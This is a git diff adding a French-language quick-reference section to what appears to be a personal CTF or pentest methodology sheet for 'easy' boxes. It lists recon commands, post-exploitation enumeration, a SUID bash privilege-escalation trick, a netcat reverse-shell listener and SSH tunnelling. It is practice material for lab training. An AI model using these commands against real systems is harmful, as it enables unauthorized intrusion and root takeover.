@@ -32,6 +32,45 @@ But : ne jamais rester bloqué sans savoir quoi faire ensuite. Dès qu'une piste
 ||||
 ||||
 
+
+## Mode rapide pour les EASY 
+```bash
+# RECONNAISSANCE
+nmap -sC -sV -oN scan.txt IP
+gobuster dir -u URL -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
+searchsploit [service] [version]
+
+# POST-EXPLOITATION
+id && whoami
+sudo -l
+find / -perm -4000 2>/dev/null
+cat /etc/crontab
+ls /etc/cron.d/
+find / -user USERNAME 2>/dev/null
+
+# MANIPULATION FICHIERS
+echo 'contenu' > fichier      # écraser
+echo 'contenu' >> fichier     # ajouter
+cat fichier                   # lire
+
+# PRIVESC SUID
+chmod u+s /bin/bash           # dans le script sudo
+/bin/bash -p                  # après execution
+whoami                        # vérifier root
+
+# REVERSE SHELLS
+nc -lvnp 4444                 # listener
+# PHP reverse shell → pentestmonkey
+# Python → import socket...
+
+# TUNNELING
+ssh -L PORT:127.0.0.1:PORT user@IP
+vncviewer -passwd fichier 127.0.0.1:PORT
+```
+
+
+
+
 ## Reconnaissance
 ```bash 
 ping -c2 <IP>
